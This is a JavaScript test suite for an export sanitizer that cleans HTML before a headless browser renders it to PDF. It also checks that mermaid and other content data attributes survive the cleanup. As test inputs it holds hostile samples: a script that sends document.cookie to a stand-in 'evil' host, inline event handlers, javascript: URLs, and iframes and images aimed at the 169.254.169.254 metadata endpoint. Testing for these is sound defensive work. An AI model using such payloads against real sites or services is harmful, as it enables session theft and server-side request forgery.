/**
 * Export sanitization + mermaid-survival tests.
 *
 * Two things are locked here:
 *
 *  1. SECURITY — export HTML arrives in a request body and is loaded into a real,
 *     networked Chromium to produce the PDF. Script must not run and the page
 *     must not be able to fetch anything (an <img> or <iframe> pointing at
 *     169.254.169.254 or an internal service turns export into SSRF).
 *
 *  2. REGRESSION — the generic `data-*` strip used to remove `data-code`, which
 *     is exactly the attribute the in-page mermaid pass reads. Diagrams silently
 *     disappeared from every export. Content-bearing data attributes must
 *     survive the cleanup.
 *
 * Run: node --test templates/exportSanitize.test.js
 */

const test = require('node:test');
const assert = require('node:assert');

const { cleanContentForExport, sanitizeContentForExport } = require('./exportTemplate');

// ── 1. Active content ─────────────────────────────────────────────
test('script elements are removed entirely', () => {
    const out = cleanContentForExport('<p>a</p><script>fetch("http://evil/"+document.cookie)</script><p>b</p>');
    assert.ok(!/<script/i.test(out), 'no script tag may survive');
    assert.ok(!out.includes('evil'), 'nor its body');
    assert.ok(out.includes('<p>a</p>') && out.includes('<p>b</p>'), 'surrounding content kept');
});

test('inline event handlers are stripped, quoted or not', () => {
    for (const frag of [
        '<img src="data:image/png;base64,AAA" onerror="alert(1)">',
        "<img src='data:image/png;base64,AAA' onerror='alert(1)'>",
        '<img src="data:image/png;base64,AAA" onerror=alert(1)>',
        '<div onclick="steal()">x</div>',
    ]) {
        const out = cleanContentForExport(frag);
        assert.ok(!/\son[a-z]+\s*=/i.test(out), `handler survived in: ${frag} → ${out}`);
    }
});

test('javascript: URLs are defused', () => {
    const out = cleanContentForExport('<a href="javascript:alert(1)">x</a>');
    assert.ok(!/javascript:/i.test(out));
});

// ── 2. Network reach (the SSRF half) ──────────────────────────────
test('iframes pointing at internal services are removed', () => {
    const out = cleanContentForExport('<iframe src="http://169.254.169.254/latest/meta-data/"></iframe><p>keep</p>');
    assert.ok(!/<iframe/i.test(out), 'no iframe may survive');
    assert.ok(!out.includes('169.254.169.254'));
    assert.ok(out.includes('keep'));
});

test('remote image loads are neutralised, data: images survive', () => {
    const remote = cleanContentForExport('<img src="http://169.254.169.254/latest/meta-data/">');
    assert.ok(!remote.includes('169.254.169.254'), 'remote fetch target must not survive');

    const inline = cleanContentForExport('<img src="data:image/png;base64,iVBORw0KGgo=">');
    assert.ok(inline.includes('data:image/png;base64,iVBORw0KGgo='), 'inlined images are the normal case and must survive');
});

test('external stylesheets, objects and embeds are removed', () => {
    const out = cleanContentForExport(
        '<link rel="stylesheet" href="http://internal/x.css"><object data="http://internal/x"></object><embed src="http://internal/y">'
    );
    assert.ok(!/<link|<object|<embed/i.test(out));
    assert.ok(!out.includes('internal'));
});

test('url() and expression() are stripped from surviving style attributes', () => {
    const out = cleanContentForExport('<div style="background:url(http://internal/x.png);width:10px">x</div>');
    assert.ok(!/url\s*\(/i.test(out), 'no CSS fetch may survive');
    assert.ok(out.includes('width:10px'), 'harmless declarations are kept');
});

// ── 3. Mermaid + content data attributes survive (C5) ─────────────
test('mermaid data-code reaches the diagram renderer instead of being stripped first', () => {
    const b64 = Buffer.from('graph TD; A-->B').toString('base64');
    const out = cleanContentForExport(`<div data-type="mermaid-diagram" data-code="${b64}"></div>`);

    // cleanContentForExport deliberately converts a mermaid node into a styled,
    // readable fallback block (PDF and DOCX both go through here). That handler
    // reads `data-code` — and the generic data-* strip used to run FIRST and
    // delete it, so the handler never matched and the node survived as an empty
    // <div>: the diagram silently disappeared from the export.
    //
    // So the invariant is not "the attribute survives", it is "the diagram
    // SOURCE reaches the output".
    assert.ok(out.includes('graph TD'), `decoded diagram source must appear in the export, got: ${out}`);
    assert.ok(out.includes('A--&gt;B'), 'the full diagram body must be present and HTML-escaped');
    assert.ok(!/data-type="mermaid-diagram"[^>]*><\/div>/.test(out), 'must not leave an empty placeholder div');
});

test('sanitization alone leaves the mermaid node intact for that handler', () => {
    const b64 = Buffer.from('graph TD; A-->B').toString('base64');
    const out = sanitizeContentForExport(`<div data-type="mermaid-diagram" data-code="${b64}"></div>`);
    assert.ok(out.includes(`data-code="${b64}"`), 'the sanitizer must not eat content attributes');
});

test('other content-bearing data attributes survive', () => {
    const out = cleanContentForExport(
        '<div data-type="blockMath" data-latex="x^2"></div>' +
        '<figure data-type="chart" data-spec="e30="></figure>' +
        '<span data-type="formula" data-formula="=SUM(A1:A2)">3</span>'
    );
    assert.ok(out.includes('data-latex="x^2"'));
    assert.ok(out.includes('data-spec="e30="'));
    assert.ok(out.includes('data-formula="=SUM(A1:A2)"'));
});

test('editor chrome data attributes are still stripped', () => {
    const out = cleanContentForExport('<p data-editor-internal="x" data-drag-handle="y">t</p>');
    assert.ok(!out.includes('data-editor-internal'));
    assert.ok(!out.includes('data-drag-handle'));
});

// ── 4. Ordinary documents are unharmed ────────────────────────────
test('a normal formatted document passes through intact', () => {
    const doc = '<h1>Title</h1><p><strong>bold</strong> and <em>italic</em> and <a href="https://example.com">a link</a></p>'
        + '<ul><li>one</li><li>two</li></ul>'
        + '<table><tbody><tr><th>H</th></tr><tr><td>C</td></tr></tbody></table>';
    const out = cleanContentForExport(doc);
    for (const frag of ['<h1>Title</h1>', '<strong>bold</strong>', '<em>italic</em>', 'https://example.com', '<li>one</li>', '<td>C</td>']) {
        assert.ok(out.includes(frag), `expected to keep ${frag}`);
    }
});

test('sanitizeContentForExport tolerates junk input', () => {
    assert.strictEqual(sanitizeContentForExport(null), '');
    assert.strictEqual(sanitizeContentForExport(undefined), '');
    assert.strictEqual(typeof sanitizeContentForExport(123), 'string');
});
